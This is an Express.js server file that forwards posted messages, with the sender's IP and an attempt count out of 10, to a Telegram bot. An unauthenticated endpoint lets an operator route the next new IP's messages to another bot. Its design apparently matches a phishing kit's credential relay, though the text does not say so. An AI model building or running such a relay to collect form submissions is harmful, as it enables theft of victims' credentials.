// index.mjs
import express from "express";
import cors from "cors";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const DEFAULT_TOKEN = process.env.APIKEY;
const DEFAULT_CHAT_ID = process.env.CHATID;

const ipRequests = {};
const redirectedIPs = {}; // { ip: { token, chatId } }
let waitingRedirect = false;
let pendingRedirect = null;

app.use(cors());
app.use(express.json());

// Ver estado de IPs
app.get("/status", (req, res) => {
  res.status(200).json(ipRequests);
});

// Resetear todas las IPs
app.delete("/reset", (req, res) => {
  Object.keys(ipRequests).forEach((ip) => delete ipRequests[ip]);
  Object.keys(redirectedIPs).forEach((ip) => delete redirectedIPs[ip]);
  res.json({ message: "Todo reiniciado" });
});

// Resetear IP específica
app.delete("/reset/:ip", (req, res) => {
  const { ip } = req.params;
  delete ipRequests[ip];
  delete redirectedIPs[ip];
  res.json({ message: `IP ${ip} eliminada` });
});

// Configurar la próxima IP a capturar
app.post("/set-capture", (req, res) => {
  const { botToken, chatId } = req.body;
  if (!botToken || !chatId)
    return res.status(400).json({ error: "Faltan parámetros" });

  pendingRedirect = { botToken, chatId };
  waitingRedirect = true;
  res.json({ message: "🔔 Esperando la próxima IP con 1 mensaje para redirigir" });
});

// Envío de mensaje general
app.post("/", async (req, res) => {
  const { message } = req.body;
  if (!message) return res.status(400).json({ error: "Falta el mensaje" });

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.socket.remoteAddress;

  ipRequests[ip] = (ipRequests[ip] || 0) + 1;

  // Captura condicional solo si es el primer mensaje
  if (waitingRedirect && ipRequests[ip] === 1 && !redirectedIPs[ip]) {
    redirectedIPs[ip] = {
      token: pendingRedirect.botToken,
      chatId: pendingRedirect.chatId,
    };
    pendingRedirect = null;
    waitingRedirect = false;
    return res.json({ message: `✅ IP ${ip} redirigida exitosamente` });
  }

  const { token, chatId } = redirectedIPs[ip] || {
    token: DEFAULT_TOKEN,
    chatId: DEFAULT_CHAT_ID,
  };

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: ` ${message}\n IP: ${ip}\n Intentos: ${ipRequests[ip]}/10`,
    parse_mode: "HTML",
  };

  try {
    const tgResponse = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!tgResponse.ok) throw new Error("Fallo al enviar a Telegram");

    res.json({
      message: "Mensaje enviado correctamente",
      ip,
      intentos: ipRequests[ip],
      redirigido: Boolean(redirectedIPs[ip]),
    });
  } catch (error) {
    console.error("Telegram error:", error.message);
    res.status(500).json({ error: "Fallo al contactar Telegram" });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor activo en http://localhost:${PORT}`);
});
